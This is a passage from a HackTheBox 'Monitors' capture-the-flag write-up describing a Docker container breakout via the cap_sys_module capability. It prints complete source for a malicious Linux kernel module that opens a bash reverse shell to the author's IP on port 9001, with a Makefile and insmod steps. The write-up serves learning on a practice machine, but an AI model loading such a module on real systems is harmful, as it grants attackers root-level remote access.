</pre></table></code></div></div><p>This looks like potential path to exploit.</p><p>I will first go with <code class="language-plaintext highlighter-rouge">cap_sys_module</code>. For this exploit I refered to this blog from <a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd">Pentester’s Academy</a>. It showed I need to make two different files <code class="language-plaintext highlighter-rouge">shell.c</code> and <code class="language-plaintext highlighter-rouge">Makefile</code>.</p><ol><li>I will just copy the source code and replace IP address to mine naming it <code class="language-plaintext highlighter-rouge">shell.c</code> .</ol><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;linux/kmod.h&gt;
#include &lt;linux/module.h&gt;
</span><span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"AttackDefense"</span><span class="p">);</span>
<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"LKM reverse shell module"</span><span class="p">);</span>
<span class="n">MODULE_VERSION</span><span class="p">(</span><span class="s">"1.0"</span><span class="p">);</span>
<span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/bash"</span><span class="p">,</span><span class="s">"-c"</span><span class="p">,</span><span class="s">"bash -i &gt;&amp; /dev/tcp/10.10.14.55/9001 0&gt;&amp;1"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
<span class="k">static</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">reverse_shell_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">call_usermodehelper</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">UMH_WAIT_EXEC</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">reverse_shell_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Exiting</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">module_init</span><span class="p">(</span><span class="n">reverse_shell_init</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">reverse_shell_exit</span><span class="p">);</span>
</pre></table></code></div></div><ol><li>Then create a <code class="language-plaintext highlighter-rouge">Makefile</code>.</ol><div class="language-makefile highlighter-rouge"><div class="code-header"> <span text-data=" Makefile "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">obj-m</span> <span class="o">+=</span>shell.o
<span class="nl">all</span><span class="o">:</span>
	make <span class="nt">-C</span> /lib/modules/<span class="nf">$(</span><span class="nb">shell</span> <span class="nb">uname</span> <span class="nt">-r</span><span class="nf">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="nv">$(PWD)</span> modules
<span class="nl">clean</span><span class="o">:</span>
	make <span class="nt">-C</span> /lib/modules/<span class="nf">$(</span><span class="nb">shell</span> <span class="nb">uname</span> <span class="nt">-r</span><span class="nf">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="nv">$(PWD)</span> clean
</pre></table></code></div></div><p>Now that I have both files under one directory.</p><ol><li>Its time to just type <code class="language-plaintext highlighter-rouge">make</code> . This will compile <code class="language-plaintext highlighter-rouge">shell.c</code> file and breed lots of files.</ol><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211021143856916.png" alt="image-20211021143856916" /></p><ol><li>Now I just have to insert our malicious kernel module inside in machine, using <code class="language-plaintext highlighter-rouge">insmod shell.ko</code> and I get reverse shell on my netcat listener.</ol><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211021143809034.png" alt="image-20211021143809034" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/apache/" class="post-tag no-text-decoration" >apache</a> <a href="/tags/ofbiz/" class="post-tag no-text-decoration" >ofbiz</a> <a href="/tags/8443/" class="post-tag no-text-decoration" >8443</a> <a href="/tags/deepce/" class="post-tag no-text-decoration" >deepce</a> <a href="/tags/rfi/" class="post-tag no-text-decoration" >rfi</a> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >wordpress</a> <a href="/tags/cap-sys-module/" class="post-tag no-text-decoration" >cap_sys_module</a> <a href="/tags/capability/" class="post-tag no-text-decoration" >capability</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >cve</a> <a href="/tags/2020-9496/" class="post-tag no-text-decoration" >2020-9496</a> <a href="/tags/xml/" class="post-tag no-text-decoration" >xml</a> <a href="/tags/java/" class="post-tag no-text-decoration" >java</a> <a href="/tags/xmlrpc/" class="post-tag no-text-decoration" >xmlrpc</a> <a href="/tags/rpc/" class="post-tag no-text-decoration" >rpc</a> <a href="/tags/sql/" class="post-tag no-text-decoration" >sql</a> <a href="/tags/solr/" class="post-tag no-text-decoration" >solr</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox Monitors - amroot&url=https://am-root.github.io/posts/HTB-Monitors/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox Monitors - amroot&u=https://am-root.github.io/posts/HTB-Monitors/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://am-root.github.io/posts/HTB-Monitors/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Nunchucks/">HackTheBox Nunchucks</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/443/">443</a> <a class="post-tag" href="/tags/apache/">apache</a> <a class="post-tag" href="/tags/blackhat/">blackhat</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/capability/">capability</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Nunchucks/"><div class="card-body"> <span class="timeago small" >Nov 9, 2021<i class="unloaded">2021-11-09T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Nunchucks</h3><div class="text-muted small"><p> Nunchucks is an Easy level box that is using ExpreessJS application template engine, Nunjucks, and later finding out its subdomain. On that subdomain Server Side Template Injection(SSTI) vulnerabil...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Driver/"><div class="card-body"> <span class="timeago small" >Feb 26<i class="unloaded">2022-02-26T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Driver</h3><div class="text-muted small"><p> Machine information Driver listed as an Easy machine. Port 80 is serving MFP Firmware update center site where uploading maliciously crafted file is stored in SMB server that leads to a password h...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Pikaboo/"><div class="card-body"> <span class="timeago small" >Dec 14, 2021<i class="unloaded">2021-12-14T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Pikaboo</h3><div class="text-muted small"><p> Machine Information Pikaboo is extremely fun box to solve. The box starts with enumeration on web server that is hosting nginx but later finding that Apache is running as well. Apache server can b...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/HTB-Nunchucks/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox Nunchucks</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/_amroot">Janak Khairmode</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/443/">443</a> <a class="post-tag" href="/tags/apache/">apache</a> <a class="post-tag" href="/tags/blackhat/">blackhat</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/capability/">capability</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
